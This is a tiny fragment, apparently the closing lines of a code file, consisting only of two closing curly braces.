    }
}